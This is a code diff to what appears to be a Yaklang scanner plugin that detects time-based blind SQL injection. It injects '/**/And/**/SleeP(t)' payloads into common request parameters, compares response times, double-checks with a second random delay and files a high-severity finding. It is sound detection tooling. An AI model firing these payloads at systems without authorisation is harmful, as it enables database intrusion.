@@ -1,5 +1,5 @@
-buildSqlPayload = (pre, suf) => {
-    return f"${pre}/**/And/**/SleeP(3)${suf}"
+buildSqlPayload = (pre, suf, t) => {
+    return f"${pre}/**/And/**/SleeP(${t})${suf}"
 }
 
 sqlBuildPrefix = func(paramValue) {
@@ -38,11 +38,20 @@ fixDesc = `
 6. 定期进行安全审计和渗透测试：这可以帮助检测和修复可能被攻击者利用的任何漏洞。
 7. 保持数据库软件和应用程序的更新：这是防止漏洞被利用的重要措施，因为许多更新都包含了对已知漏洞的修复。`
 
+timeBlindCheck = func (p,originalT,payload,t) {
+    result, err := p.Fuzz(payload).ExecFirst()
+    if err != nil {
+        dump(err)
+        return nil,false
+    }
+    printf("response Time(ms): %d t , time blind %d(ms)\n", result.ServerDurationMs, t*1000)
+    return result,result.ServerDurationMs >= originalT + t * 1000
+}
+
 # mirrorNewWebsitePathParams 每新出现一个网站路径且带有一些参数，参数通过常见位置和参数名去重，去重的第一个 HTTPFlow 在这里被调用
 mirrorNewWebsitePathParams = func(isHttps /*bool*/, url /*string*/, req /*[]byte*/, rsp /*[]byte*/, body /*[]byte*/) {
     rsp, _ = poc.HTTPEx(req, poc.https(isHttps))~
-    t = rsp.TraceInfo.GetServerDurationMS()
-
+    originalT = rsp.TraceInfo.GetServerDurationMS()
 
     freq = fuzz.HTTPRequest(req, fuzz.https(isHttps))~
     for p in freq.GetCommonParams() {
@@ -52,31 +61,35 @@ mirrorNewWebsitePathParams = func(isHttps /*bool*/, url /*string*/, req /*[]byte
         var prefix = sqlBuildPrefix(val)
         for suf in suffix {
             for pre in prefix {
-                payload := buildSqlPayload(pre, suf)
-                result, err := p.Fuzz(payload).ExecFirst()
-                if err != nil { 
-                    dump(err)
+                t = randn(4, 6)
+                payload := buildSqlPayload(pre, suf, t)
+                result,check = timeBlindCheck(p,originalT,payload,t)
+                if !check {
                     continue
                 }
-                printf("response Time(ms): %d t + 3000(ms): %d\n", result.ServerDurationMs, t+3000)
-                if  result.ServerDurationMs >= t + 3000 {
+                t = randn(1, 3)
+                payload := buildSqlPayload(pre, suf, t)
+                result,check = timeBlindCheck(p,originalT,payload,t)
+                if check { // 二次检查
                     risk.NewRisk(
-                        url,
-                        risk.severity("high"),
-                        risk.type("sqlinjection"),
-                        risk.title(f"SQL Time-Blind-Based Injection: ${url}"),
-                        risk.titleVerbose(f"SQL时间盲注（Sleep）：: ${url}"),
-                        risk.parameter(f`Param: ${p.Name()} OriginValue: ${val}`),
-                        risk.payload(f`Payload: ${payload}`),
-                        risk.request(result.RequestRaw),
-                        risk.response(result.ResponseRaw),
-                        risk.description(description),
-                        risk.solution(solution),
-                    )
-                    return
+                            url,
+                            risk.severity("high"),
+                            risk.type("sqlinjection"),
+                            risk.title(f"SQL Time-Blind-Based Injection: ${url}"),
+                            risk.titleVerbose(f"SQL时间盲注（Sleep）：: ${url}"),
+                            risk.parameter(f`Param: ${p.Name()} OriginValue: ${val}`),
+                            risk.payload(f`Payload: ${payload}`),
+                            risk.request(result.RequestRaw),
+                            risk.response(result.ResponseRaw),
+                            risk.description(description),
+                            risk.solution(solution),
+                        )
+                        return
                 }
             }
         }
     }
 }
+
+
 
